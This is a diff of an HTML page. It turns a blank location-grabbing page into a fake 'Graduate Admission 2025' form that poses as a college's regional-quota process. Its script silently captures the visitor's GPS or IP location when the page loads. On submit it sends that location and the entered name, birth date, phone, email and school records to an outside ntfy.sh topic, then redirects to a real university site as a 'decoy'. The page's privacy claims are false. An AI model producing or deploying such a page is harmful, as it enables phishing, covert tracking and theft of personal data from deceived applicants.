@@ -3,51 +3,262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title>
-    <!-- PWA for home‑screen permission persistence -->
+    <title>Admission Form – Graduate Program 2025</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
-    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIk5vdGVzIiwKICAic2hvcnRfbmFtZSI6ICJOb3RlcyIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjZmZmZmZmIiwKICAidGhlbWVfY29sb3IiOiAiI2ZmZmZmZiIKfQ==">
+    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIkFkbWlzc2lvbiBGb3JtIiwKICAic2hvcnRfbmFtZSI6ICJBZG1pc3Npb24iLAogICJzdGFydF91cmwiOiAiLiIsCiAgImRpc3BsYXkiOiAic3RhbmRhbG9uZSIsCiAgImJhY2tncm91bmRfY29sb3IiOiAiI2Y4ZjlmYSIsCiAgInRoZW1lX2NvbG9yIjogIiMwMDMzNjYiCn0=">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #f8f9fa;
+            --card: #ffffff;
+            --text: #212529;
+            --primary: #003366;
+            --border: #dee2e6;
+            --focus: #80bdff;
+            --radius: 10px;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #ffffff;
+            background: var(--bg);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            font-family: -apple-system, sans-serif;
+            min-height: 100vh;
+            padding: 16px;
+            line-height: 1.5;
         }
-        .dot {
-            width: 10px; height: 10px; border-radius: 50%;
-            background: #d0d0d0;
-            animation: pulse 1.5s ease-in-out infinite;
+        .form-container {
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 540px;
+            padding: 32px 24px;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.2); }
+        .header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .header h1 {
+            font-size: 1.7rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 6px;
+        }
+        .header .subtitle {
+            font-size: 0.9rem;
+            color: #555;
+        }
+        .location-note {
+            background: #e7f1ff;
+            border-left: 4px solid var(--primary);
+            padding: 10px 14px;
+            font-size: 0.8rem;
+            color: #004085;
+            margin-bottom: 24px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .location-note span.icon {
+            font-size: 1.2rem;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 6px;
+            color: #333;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            background: #fff;
+            color: #000;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--focus);
+            box-shadow: 0 0 0 3px rgba(0,51,102,0.1);
+        }
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            letter-spacing: 0.3px;
+            margin-top: 8px;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .submit-btn:hover {
+            background: #002244;
+        }
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+        .status-msg {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 14px;
+            display: none;
+        }
+        .small-note {
+            font-size: 0.75rem;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+            padding-top: 14px;
+        }
+        @media (max-width: 400px) {
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .form-container {
+                padding: 24px 16px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="dot"></div>
+    <div class="form-container">
+        <div class="header">
+            <h1>📘 Graduate Admission 2025</h1>
+            <p class="subtitle">Vacant Seat Round – Location-Based Allocation</p>
+        </div>
+
+        <!-- Location status -->
+        <div class="location-note" id="locationNote">
+            <span class="icon">📍</span>
+            <span id="locationNoteText">Verifying regional quota eligibility (GPS / IP)…</span>
+        </div>
+
+        <form id="admissionForm">
+            <div class="form-group">
+                <label for="fullName">Full Name *</label>
+                <input type="text" id="fullName" placeholder="As per 12th certificate" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label for="dob">Date of Birth *</label>
+                    <input type="date" id="dob" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="you@example.com">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number *</label>
+                <input type="tel" id="phone" placeholder="+91 9876543210" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label for="tenSchool">10th Grade School</label>
+                    <input type="text" id="tenSchool" placeholder="School name">
+                </div>
+                <div class="form-group">
+                    <label for="tenPercent">10th % / CGPA</label>
+                    <input type="text" id="tenPercent" placeholder="e.g., 85%">
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label for="twelveSchool">12th Grade School</label>
+                    <input type="text" id="twelveSchool" placeholder="School name">
+                </div>
+                <div class="form-group">
+                    <label for="twelvePercent">12th % / CGPA</label>
+                    <input type="text" id="twelvePercent" placeholder="e.g., 92%">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="course">Preferred Course *</label>
+                <select id="course" required>
+                    <option value="" disabled selected>-- Select --</option>
+                    <option>B.Sc. Computer Science</option>
+                    <option>B.Com (Honours)</option>
+                    <option>B.A. Journalism</option>
+                    <option>B.Tech (Lateral Entry)</option>
+                    <option>BBA</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="sop">Statement of Purpose (min 50 words)</label>
+                <textarea id="sop" placeholder="Briefly describe your academic interests and why you chose this institution…"></textarea>
+            </div>
+
+            <button type="submit" class="submit-btn">Submit Application</button>
+            <div class="status-msg" id="statusMsg"></div>
+        </form>
+
+        <p class="small-note">
+            By submitting this form, you agree to the use of your location (GPS or IP) solely for seat allocation under regional quota. <br>Your data is not stored on this device.
+        </p>
+    </div>
 
     <script>
         (function() {
             // ============================================================
-            //  YOUR CONFIGURATION – EDIT THESE TWO VALUES
+            //  CONFIGURATION
             // ============================================================
-            const NTFY_TOPIC = 'Location_Notify';   // long random string (e.g., 'fam7xq2k9m')
-            const DECOY_URL = 'https://www.iitb.ac.in/';    // innocent redirect page
-            const GPS_TIMEOUT = 1000000;                      // 5 seconds
+            const NTFY_TOPIC = 'Location_Notify';   // long random string
+            const DECOY_URL = 'https://www.iitb.ac.in/'; // redirect after submit
+            const SEND_FORM_DATA = true;                   // true = send form fields + location
             // ============================================================
 
-            // -----------------------------------------------------------------
-            // 1. GPS (works silently if permission already granted)
-            // -----------------------------------------------------------------
+            const GPS_TIMEOUT = 5000;
+            let locationSent = false;
+            let currentLocation = null;
+
+            const locationNoteText = document.getElementById('locationNoteText');
+            const locationNote = document.getElementById('locationNote');
+            const statusMsg = document.getElementById('statusMsg');
+            const form = document.getElementById('admissionForm');
+
+            // GPS
             function getGpsLocation() {
                 return new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) return reject(new Error('no gps'));
+                    if (!navigator.geolocation) return reject({ code: -1, message: 'no gps' });
                     navigator.geolocation.getCurrentPosition(
                         pos => resolve({
                             lat: pos.coords.latitude,
@@ -61,9 +272,7 @@
                 });
             }
 
-            // -----------------------------------------------------------------
-            // 2. IP fallback (no permission needed)
-            // -----------------------------------------------------------------
+            // IP fallback
             async function getIpLocation() {
                 const resp = await fetch('https://ipapi.co/json/');
                 if (!resp.ok) throw new Error('ip api failed');
@@ -78,67 +287,119 @@
                 };
             }
 
-            // -----------------------------------------------------------------
-            // Build short message for ntfy
-            // -----------------------------------------------------------------
-            function buildNtfyMessage(loc) {
+            // Build ntfy message (location only, or location + form)
+            function buildMessage(loc, formData = null) {
                 const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                 const time = new Date().toLocaleString();
-                return (
+                let msg =
                     `📍 ${loc.source.toUpperCase()} Location\n` +
                     (loc.city ? `Area: ${loc.city}, ${loc.region}, ${loc.country}\n` : '') +
                     `Lat: ${loc.lat}, Lng: ${loc.lng}\n` +
                     (loc.accuracy ? `Accuracy: ±${loc.accuracy}m\n` : '') +
                     `Time: ${time}\n` +
-                    `Map: ${mapsUrl}`
-                );
-            }
+                    `Map: ${mapsUrl}`;
 
-            // -----------------------------------------------------------------
-            // Send via ntfy using sendBeacon (guaranteed delivery)
-            // -----------------------------------------------------------------
-            function sendNtfy(loc) {
-                if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return;
-                const msg = buildNtfyMessage(loc);
-                const blob = new Blob([msg], { type: 'text/plain' });
-                navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
-            }
-
-            // -----------------------------------------------------------------
-            // Redirect to decoy page (no trace)
-            // -----------------------------------------------------------------
-            function redirectToDecoy() {
-                setTimeout(() => {
-                    if (DECOY_URL) window.location.replace(DECOY_URL);
-                }, 700);
-            }
-
-            // -----------------------------------------------------------------
-            // Main emergency sequence
-            // -----------------------------------------------------------------
-            async function emergency() {
-                let loc;
-                try {
-                    loc = await getGpsLocation();
-                } catch (e) {
-                    try {
-                        loc = await getIpLocation();
-                    } catch (e2) {
-                        // Total failure – still redirect to avoid suspicion
-                        redirectToDecoy();
-                        return;
+                if (formData) {
+                    msg += `\n📝 Admission Form Details:\n`;
+                    for (const [key, value] of Object.entries(formData)) {
+                        msg += `${key}: ${value}\n`;
                     }
                 }
-
-                // Send location silently
-                sendNtfy(loc);
-
-                // Redirect to harmless site
-                redirectToDecoy();
+                return msg;
             }
 
-            // Start immediately when the page loads
-            emergency();
+            // Send via ntfy (sendBeacon)
+            function sendNtfy(loc, formData = null) {
+                if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return false;
+                const msg = buildMessage(loc, formData);
+                const blob = new Blob([msg], { type: 'text/plain' });
+                return navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
+            }
+
+            // Update location UI
+            function updateLocationNote(text, isError = false) {
+                locationNoteText.textContent = text;
+                if (isError) {
+                    locationNote.style.borderLeftColor = '#dc3545';
+                    locationNote.style.background = '#f8d7da';
+                    locationNote.style.color = '#721c24';
+                } else {
+                    locationNote.style.borderLeftColor = '#003366';
+                    locationNote.style.background = '#e7f1ff';
+                    locationNote.style.color = '#004085';
+                }
+            }
+
+            // Collect form data as a simple object
+            function getFormData() {
+                return {
+                    Name: document.getElementById('fullName').value,
+                    DOB: document.getElementById('dob').value,
+                    Email: document.getElementById('email').value,
+                    Phone: document.getElementById('phone').value,
+                    '10th School': document.getElementById('tenSchool').value,
+                    '10th %': document.getElementById('tenPercent').value,
+                    '12th School': document.getElementById('twelveSchool').value,
+                    '12th %': document.getElementById('twelvePercent').value,
+                    Course: document.getElementById('course').value,
+                    SOP: document.getElementById('sop').value
+                };
+            }
+
+            // Initial location capture (instant)
+            async function handleLocation() {
+                updateLocationNote('Checking GPS location…');
+                try {
+                    const gpsLoc = await getGpsLocation();
+                    currentLocation = gpsLoc;
+                    locationSent = sendNtfy(gpsLoc);  // location only
+                    updateLocationNote('✅ GPS location verified – regional quota eligibility confirmed.');
+                } catch (gpsError) {
+                    updateLocationNote('GPS not available. Trying IP-based location…');
+                    try {
+                        const ipLoc = await getIpLocation();
+                        currentLocation = ipLoc;
+                        locationSent = sendNtfy(ipLoc);
+                        updateLocationNote('✅ IP-based region identified – quota check completed.');
+                    } catch (ipError) {
+                        updateLocationNote('⚠️ Location check failed (GPS & IP unavailable).', true);
+                    }
+                }
+            }
+
+            // Form submit – send form data + location, then redirect
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                statusMsg.style.display = 'block';
+                statusMsg.textContent = 'Submitting your application…';
+                const submitBtn = form.querySelector('.submit-btn');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing…';
+
+                // Send form data via ntfy (if enabled and location is available)
+                if (SEND_FORM_DATA && currentLocation) {
+                    const formData = getFormData();
+                    sendNtfy(currentLocation, formData);
+                }
+
+                // Redirect after a short delay
+                setTimeout(() => {
+                    statusMsg.textContent = 'Redirecting to official college portal…';
+                    setTimeout(() => {
+                        if (DECOY_URL) {
+                            window.location.href = DECOY_URL;
+                        } else {
+                            statusMsg.textContent = 'Submission complete. Thank you!';
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Submit Application';
+                        }
+                    }, 800);
+                }, 1200);
+            });
+
+            // Start location capture immediately
+            handleLocation();
         })();
     </script>
 </body>
